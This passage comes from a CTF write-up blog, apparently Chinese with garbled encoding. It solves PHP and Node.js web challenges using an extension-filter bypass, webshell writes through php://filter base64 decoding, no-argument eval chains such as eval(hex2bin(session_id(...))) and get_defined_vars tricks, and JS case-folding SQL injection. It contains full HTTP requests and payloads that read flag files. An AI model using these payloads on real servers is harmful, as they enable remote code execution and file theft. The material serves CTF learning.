class="number">1000000</span>)</span><br></pre></td></tr></table></figure></p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨<code>readfile</code>å‡½æ•°æ¥è¯»å–æ–‡ä»¶<br>æ­¤ç±»å‹çš„ä¿®å¤æ–¹å¼æ˜¯ä½¿ç”¨å¼ºç­‰äºçš„æ–¹å¼æ¥åˆ¤æ–­åŒ¹é…çš„ç»“æœ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_php($data) === <span class="number">0</span>)&#123; </span><br><span class="line">    write ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>PS: è¿™ä¸ªé¢˜ç›®åœ¨æœ€åˆæ˜¯å­˜åœ¨ä¸€ä¸ªéé¢„æœŸè§£çš„ï¼Œå½“æ—¶çš„æ­£åˆ™å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[\(\`].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è¿™ç§å½¢å¼æ˜¯å¯ä»¥ä½¿ç”¨glob+file_get_contentsæ¥è·å–flagçš„ï¼Œå…·ä½“å½¢å¼å¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chopper=var_dump(glob(&apos;../../../*&apos;));</span><br><span class="line">chopper=var_dump(file_get_contents(&apos;../../../flag_php7_2_1s_c0rrect&apos;));</span><br></pre></td></tr></table></figure></p><p>glob()å‡½æ•°æ˜¯è·å–ä¸æ¨¡å¼åŒ¹é…çš„æ–‡ä»¶è·¯å¾„ï¼Œæ‰¾åˆ°æ–‡ä»¶åç›´æ¥è¯»å–ã€‚<br>ä¹‹åçš„æ­£åˆ™ä¿®æ”¹ä¸ºäº†ç°åœ¨çš„å½¢å¼<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="0x03-phpmagic"><a href="#0x03-phpmagic" class="headerlink" title="0x03 phpmagic"></a>0x03 phpmagic</h2><p>å…³é”®åœ¨äºæ–‡ä»¶å†™å…¥çš„åœ°æ–¹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line"><span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span><br><span class="line">    file_put_contents($log_name, $output);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="1-SERVER-â€˜SERVER-NAMEâ€™"><a href="#1-SERVER-â€˜SERVER-NAMEâ€™" class="headerlink" title="1.$_SERVER[â€˜SERVER_NAMEâ€™]"></a>1.$_SERVER[â€˜SERVER_NAMEâ€™]</h3><p>(1) æŸ¥çœ‹å®˜æ–¹æ‰‹å†Œå‘ç°$_SERVER[â€˜SERVER_NAMEâ€™]æ˜¯å¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶çš„ï¼Œåªè¦ä¿®æ”¹æ•°æ®åŒ…ä¸­hostå­—æ®µçš„å€¼å°±å¥½<br><img src="https://i.loli.net/2020/06/04/itv2VnEGmoTgcdQ.png" alt="87A5F220-D3F9-4BC8-B5D3-2ABA6F3A8077.png"></p><p>(2) <code>$log_name</code>æ¥è‡ª<code>$_POST[&#39;log&#39;]</code>å› è€Œä¹Ÿå¯æ§</p><h3 id="2-è§£å†³æ‰©å±•åè¿‡æ»¤é—®é¢˜"><a href="#2-è§£å†³æ‰©å±•åè¿‡æ»¤é—®é¢˜" class="headerlink" title="2.è§£å†³æ‰©å±•åè¿‡æ»¤é—®é¢˜"></a>2.è§£å†³æ‰©å±•åè¿‡æ»¤é—®é¢˜</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹payloadå¯ä»¥ç»•è¿‡pathinfoå¯¹åç¼€åçš„æ£€æµ‹ï¼Œè¿›è€Œå°†å†…å®¹æ­£å¸¸å†™å…¥filename.phpæ–‡ä»¶ä¸­<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=shell.php/.&amp;content=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure></p><h3 id="3-è§£å†³htmlspecialcharsè¿‡æ»¤é—®é¢˜"><a href="#3-è§£å†³htmlspecialcharsè¿‡æ»¤é—®é¢˜" class="headerlink" title="3.è§£å†³htmlspecialcharsè¿‡æ»¤é—®é¢˜"></a>3.è§£å†³htmlspecialcharsè¿‡æ»¤é—®é¢˜</h3><p>htmlspecialcharså‡½æ•°ä¼šå°†â€™&lt;â€™è½¬ä¸ºâ€™&lt;â€™ï¼Œå› è€Œä¸èƒ½å¤Ÿç›´æ¥å†™webshellã€‚ä½†æ˜¯ phithon æ›¾åœ¨ä¸€ç¯‡æ–‡ç« ä¸­æåˆ°ä½¿ç”¨PHPä¼ªåè®®+base64/rot13ç¼–ç å’Œè§£ç è¿‡ç¨‹å¤„ç†æ‰exitâ€“<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">ã€Šè°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨ã€‹</a></p><p>PS:</p><ol><li>base64å¿…é¡»æ˜¯4çš„æ•´æ•°å€ï¼›</li><li>è¦æ³¨æ„base64ä¸­çš„=åªèƒ½å‡ºç°åœ¨æœ€æœ«å°¾ï¼Œè€Œæˆ‘ä»¬æ’å…¥çš„å­—ç¬¦ä¸²æ˜¯åœ¨ä¸­é—´çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ’å…¥çš„å­—ç¬¦ä¸²é‡Œä¸èƒ½æœ‰=ï¼›</li><li>PHPä¼ªåè®®base64è§£ç çš„trickï¼šè§£ç ä¸­é‡åˆ°ä¸ç¬¦åˆè§„èŒƒçš„å­—ç¬¦ç›´æ¥è·³è¿‡ã€‚</li></ol><p>PHPå…·æœ‰ä¸€ä¸ªç‰¹ç‚¹ï¼šä¸€åˆ‡ä¼ å…¥filenameçš„åœ°æ–¹éƒ½å¯ä»¥ä½¿ç”¨phpä¼ªåè®®ï¼Œæ¯”å¦‚ï¼šfile_put_contentså’Œreadfileå‡½æ•°ã€‚åœ¨è§£æpharçš„æ—¶å€™æ›¾æåˆ°è¿‡å¤§é‡çš„æ­¤ç±»å‡½æ•°ã€‚</p><h3 id="4-å¯»æ‰¾å¯æ§å˜é‡æ„é€ payload"><a href="#4-å¯»æ‰¾å¯æ§å˜é‡æ„é€ payload" class="headerlink" title="4.å¯»æ‰¾å¯æ§å˜é‡æ„é€ payload"></a>4.å¯»æ‰¾å¯æ§å˜é‡æ„é€ payload</h3><p>å¯ä»¥çœ‹åˆ°$domainå†…å®¹å¯æ§</p><p><img src="https://i.loli.net/2020/06/04/MBCDKwWd1STzj3g.png" alt="163EC8AD-F408-4BF0-BA9F-0B9F455715CA.png"></p><p>æ„é€ å¯åˆ©ç”¨çš„base64å­—ç¬¦ä¸²ï¼Œæœ€ç»ˆçš„æ•°æ®åŒ…å¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: php</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://127.0.0.1:8082/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 126</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">domain=PD89YGNhdCAnLi4vLi4vLi4vZmxhZ19waHBtYWcxY191cjEnYDsvKioq&amp;log=://filter/write=convert.base64-decode/resource=shell.php/.</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/06/04/v4BpzdmSoRl1fLY.png" alt="18E49C67-5050-48F3-BA38-46CF64A84919.png"></p><p><u><strong>æ­¤å¤„å¯¹shellçš„æ„é€ æœ‰å‘ï¼Œæ™šä¸Šå¡«ä¸€ä¸‹</strong></u></p><h2 id="0x04-phplimit"><a href="#0x04-phplimit" class="headerlink" title="0x04 phplimit"></a>0x04 phplimit</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®é™åˆ¶ï¼šå‡½æ•°å¯ä»¥å¤šå±‚åµŒå¥—ä½†æ˜¯æœ€åä¸€ä¸ªä¸èƒ½åŒ…å«å‚æ•°.</p><h3 id="1-session-id"><a href="#1-session-id" class="headerlink" title="1.session_id"></a>1.session_id</h3><p>session_idç”¨äºè®¾ç½®å’Œè·å–å½“å‰çš„ä¼šè¯idï¼Œä¹Ÿå°±æ˜¯PHPSESSIDçš„å€¼ï¼Œé‡‡ç”¨å¦‚ä¸‹è¿™ç§æ–¹å¼å°±å¯ä»¥è·å–å½“å‰çš„PHPSESSIDçš„ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session_id(session_start())</span><br></pre></td></tr></table></figure></p><p>è‡³äºç¼–ç é—®é¢˜å¯ä»¥ä½¿ç”¨hex2bin()å‡½æ•°æ¥è§£å†³ï¼Œhex2bin()å¹¶ä¸æ˜¯å°†16è¿›åˆ¶è½¬æ¢ä¸º2è¿›åˆ¶ï¼Œè€Œæ˜¯å°†16è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸º2è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œç¤ºä¾‹å¦‚ä¸‹:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $t=<span class="string">"7072696e745f722866696c655f6765745f636f6e74656e747328272e2e2f666c61675f7068706279703473732729293b"</span>;</span><br><span class="line">php &gt; var_dump(hex2bin($t));</span><br><span class="line">string(<span class="number">48</span>) <span class="string">"print_r(file_get_contents('../flag_phpbyp4ss'));"</span></span><br><span class="line">php &gt; $tt=<span class="string">"print_r(file_get_contents('../flag_phpbyp4ss'));"</span>;</span><br><span class="line">php &gt; var_dump(bin2hex($tt));</span><br><span class="line">string(<span class="number">96</span>) <span class="string">"7072696e745f722866696c655f6765745f636f6e74656e747328272e2e2f666c61675f7068706279703473732729293b"</span></span><br></pre></td></tr></table></figure></p><p>æœ€ç»ˆæ„é€ çš„æ•°æ®åŒ…å¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /?code=eval(hex2bin(session_id(session_start()))); HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8084</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: PHPSESSID=7072696e745f722866696c655f6765745f636f6e74656e747328272e2e2f666c61675f7068706279703473732729293b</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/06/04/qB45j72EhPvSmiR.png" alt="1BEFF8E8-E2FD-46F0-8FFA-1546502AEDD5.png"></p><h3 id="2-get-defined-vars"><a href="#2-get-defined-vars" class="headerlink" title="2.get_defined_vars"></a>2.get_defined_vars</h3><p><img src="https://i.loli.net/2020/06/04/QreI4gdL2FV8Yny.png" alt="2D6D5105-7368-4C0D-890A-4784365E502E.png"></p><p>ä¸‹é¢çœ‹ä¸€ä¸ªç¤ºä¾‹ï¼š<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $b = <span class="string">"zeroyu"</span>;</span><br><span class="line">php &gt; $arr = get_defined_vars();</span><br><span class="line">php &gt; print_r($arr[<span class="string">"b"</span>]);</span><br><span class="line">zeroyu</span><br></pre></td></tr></table></figure></p><p>å› ä¸ºä¸èƒ½ä¼ å…¥å‚æ•°æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç»“åˆcurrent()å’Œnext()å‡½æ•°æ¥å®Œæˆå¯¹å˜é‡çš„å–å€¼ï¼Œæœ€ç»ˆæ„é€ payloadå¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=eval(next(current(get_defined_vars())));&amp;zeroyu=print_r(scandir(&apos;../&apos;));print_r(file_get_contents(&apos;../flag_phpbyp4ss&apos;));</span><br></pre></td></tr></table></figure></p><p>æ­¤å¤–è¿˜å¯ä»¥ä½¿ç”¨resetæ¥å°†æ•°ç»„æŒ‡é’ˆå®šä½åˆ°ç¬¬ä¸€ä¸ªä½ç½®è¿›è€Œè·å–æˆ‘ä»¬æƒ³è¦çš„å˜é‡ï¼Œä»è€Œæ„é€ payloadå¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?test=readfile(&quot;../flag_phpbyp4ss&quot;);//&amp;code=eval(implode(reset(get_defined_vars())));</span><br></pre></td></tr></table></figure></p><p>ä¹‹å‰æåˆ°è¿‡ç‰Œglobå‡½æ•°ï¼Œæ‰€ä»¥payloadè¿˜å¯ä»¥è¿™æ ·å†™<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=eval(next(current(get_defined_vars())));&amp;b=var_dump(glob(%27/var/www/*%27));print_r(file_get_contents(&apos;../flag_phpbyp4ss&apos;));</span><br></pre></td></tr></table></figure></p><h3 id="3-getcwd"><a href="#3-getcwd" class="headerlink" title="3. getcwd"></a>3. getcwd</h3><p>getcwd()å‡½æ•°æ˜¯è·å–å½“å‰ç›®å½•ï¼Œæ‰€ä»¥é€šè¿‡åˆ‡æ¢ç›®å½•è¯»æ–‡ä»¶çš„æ–¹æ¡ˆä¹Ÿæ˜¯å¯è¡Œçš„<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure></p><p>PS:é™„åŠ å‡ ä¸ªå°æ —å­<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=print(readdir(opendir(getcwd()))); å¯ä»¥åˆ—ç›®å½•</span><br><span class="line">?cmd=print(readfile(readdir(opendir(getcwd())))); è¯»æ–‡ä»¶</span><br><span class="line">?cmd=print(dirname(dirname(getcwd()))); printå‡º/var/www</span><br></pre></td></tr></table></figure></p><h3 id="4-getallheaders"><a href="#4-getallheaders" class="headerlink" title="4.getallheaders"></a>4.getallheaders</h3><p>getallheaders()å¯ä»¥è·å–å…¨éƒ¨HTTPè¯·æ±‚å¤´ä¿¡æ¯ï¼Œä»è€Œä¼ªé€ HTTPå¤´å­—æ®µå°±å¯ä»¥è¾¾åˆ°RCEæ•ˆæœï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°æ˜¯apache_request_headerså‡½æ•°çš„åˆ«åï¼Œåªé€‚ç”¨äºapacheç¯å¢ƒå¯¹äºæœ¬é¢˜ç›®æ˜¯æ²¡æœ‰ä½œç”¨çš„ã€‚</p><p>å…³äºè¿™ä¸ªå‡½æ•°çš„ä½¿ç”¨ï¼Œå¯ä»¥å‚è€ƒRCTF 2018çš„r-cursiveé¢˜ç›®ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /?cmd=eval(implode(getallheaders())); HTTP/1.1</span><br><span class="line">cmd: phpinfo(); //</span><br></pre></td></tr></table></figure></p><p>PS:é‚£é“é¢˜ç›®ä¸­è¿˜æ¶‰åŠåˆ°åˆ©ç”¨open_basedirè¿›è¡Œæ²™ç›’é€ƒé€¸</p><h3 id="5-getenv"><a href="#5-getenv" class="headerlink" title="5.getenv"></a>5.getenv</h3><p>è¿™ä¸ªå‡½æ•°å†PHP5.6ç‰ˆæœ¬ä¸‹ä¸èƒ½ä½¿ç”¨ï¼Œä½†æ˜¯åœ¨PHP7.1ä»¥åŠä»¥ä¸Šç‰ˆæœ¬æ˜¯å¯ä»¥åœ¨ä¸åŠ å‚æ•°çš„æƒ…å†µä¸‹åƒget_defined_vars()ä¸€æ ·è·å–æœåŠ¡æ®µçš„envæ•°æ®ã€‚</p><h2 id="0x05-nodechr"><a href="#0x05-nodechr" class="headerlink" title="0x05 nodechr"></a>0x05 nodechr</h2><p>æ­¤é¢˜ç›®è€ƒå¯Ÿä¸€äº›javascriptçš„å°ç‰¹æ€§ï¼š<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isString(keyword) &amp;&amp; !keyword.match(<span class="regexp">/(union|select|;|\-\-)/i</span>s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ctx.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> username = safeKeyword(ctx.request.body[<span class="string">'username'</span>])</span><br><span class="line">        <span class="keyword">let</span> password = safeKeyword(ctx.request.body[<span class="string">'password'</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> jump = ctx.router.url(<span class="string">'login'</span>)</span><br><span class="line">        <span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">            <span class="keyword">let</span> user = <span class="keyword">await</span> ctx.db.get(<span class="string">`SELECT * FROM "users" WHERE "username" = '<span class="subst">$&#123;username.toUpperCase()&#125;</span>' AND "password" = '<span class="subst">$&#123;password.toUpperCase()&#125;</span>'`</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user) &#123;</span><br><span class="line">                ctx.session.user = user</span><br><span class="line"></span><br><span class="line">                jump = ctx.router.url(<span class="string">'admin'</span>)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.status = <span class="number">303</span></span><br><span class="line">        ctx.redirect(jump)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> ctx.render(<span class="string">'index'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä»æºç ä¸Šçœ‹æ˜¯å¾ˆæ˜æ˜¾æ‹¼æ¥ç›´æ¥æ³¨å…¥ï¼Œä½†æ˜¯selectå’Œunionè¢«è¿‡æ»¤ã€‚</p><h3 id="1-toUpperCase-å’ŒtoLowerCase-ç‰¹æ€§"><a href="#1-toUpperCase-å’ŒtoLowerCase-ç‰¹æ€§" class="headerlink" title="1.toUpperCase()å’ŒtoLowerCase()ç‰¹æ€§"></a>1.toUpperCase()å’ŒtoLowerCase()ç‰¹æ€§</h3><p>å› è€Œåˆ©ç”¨JSçš„å°ç‰¹æ€§è¿›è¡Œç»•è¿‡ï¼Œå…·ä½“å‚è€ƒ<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">ã€ŠFuzzä¸­çš„javascriptå¤§å°å†™ç‰¹æ€§ã€‹</a></p><p>Fuzzä»£ç å¦‚ä¸‹<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">String</span>.fromCodePoint) &#123;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> defineProperty = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// IE 8 only supports `Object.defineProperty` on DOM elements</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> object = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> $defineProperty = <span class="built_in">Object</span>.defineProperty;</span><br><span class="line"><span class="keyword">var</span> result = $defineProperty(object, object, object) &amp;&amp; $defineProperty;</span><br><span class="line">&#125; <span class="keyword">catch</span>(error) &#123;&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;());</span><br><span class="line"><span class="keyword">var</span> stringFromCharCode = <span class="built_in">String</span>.fromCharCode;</span><br><span class="line"><span class="keyword">var</span> floor = <span class="built_in">Math</span>.floor;</span><br><span class="line"><span class="keyword">var</span> fromCodePoint = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> MAX_SIZE = <span class="number">0x4000</span>;</span><br><span class="line"><span class="keyword">var</span> codeUnits = [];</span><br><span class="line"><span class="keyword">var</span> highSurrogate;</span><br><span class="line"><span class="keyword">var</span> lowSurrogate;</span><br><span class="line"><span class="keyword">var</span> index = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">var</span> length = <span class="built_in">arguments</span>.length;</span><br><span class="line"><span class="keyword">if</span> (!length) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> result = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">while</span> (++index &lt; length) &#123;</span><br><span class="line"><span class="keyword">var</span> codePoint = <span class="built_in">Number</span>(<span class="built_in">arguments</span>[index]);</span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">!<span class="built_in">isFinite</span>(codePoint) || <span class="comment">// `NaN`, `+Infinity`, or `-Infinity`</span></span><br><span class="line">codePoint &lt; <span class="number">0</span> || <span class="comment">// not a valid Unicode code point</span></span><br><span class="line">codePoint &gt; <span class="number">0x10FFFF</span> || <span class="comment">// not a valid Unicode code point</span></span><br><span class="line">floor(codePoint) != codePoint <span class="comment">// not an integer</span></span><br><span class="line">) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="built_in">RangeError</span>(<span class="string">'Invalid code point: '</span> + codePoint);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (codePoint &lt;= <span class="number">0xFFFF</span>) &#123; <span class="comment">// BMP code point</span></span><br><span class="line">codeUnits.push(codePoint);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// Astral code point; split in surrogate halves</span></span><br><span class="line"><span class="comment">// http://mathiasbynens.be/notes/javascript-encoding#surrogate-formulae</span></span><br><span class="line">codePoint -= <span class="number">0x10000</span>;</span><br><span class="line">highSurrogate = (codePoint &gt;&gt; <span class="number">10</span>) + <span class="number">0xD800</span>;</span><br><span class="line">lowSurrogate = (codePoint % <span class="number">0x400</span>) + <span class="number">0xDC00</span>;</span><br><span class="line">codeUnits.push(highSurrogate, lowSurrogate);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (index + <span class="number">1</span> == length || codeUnits.length &gt; MAX_SIZE) &#123;</span><br><span class="line">result += stringFromCharCode.apply(<span class="literal">null</span>, codeUnits);</span><br><span class="line">codeUnits.length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span> (defineProperty) &#123;</span><br><span class="line">defineProperty(<span class="built_in">String</span>, <span class="string">'fromCodePoint'</span>, &#123;</span><br><span class="line"><span class="string">'value'</span>: fromCodePoint,</span><br><span class="line"><span class="string">'configurable'</span>: <span class="literal">true</span>,</span><br><span 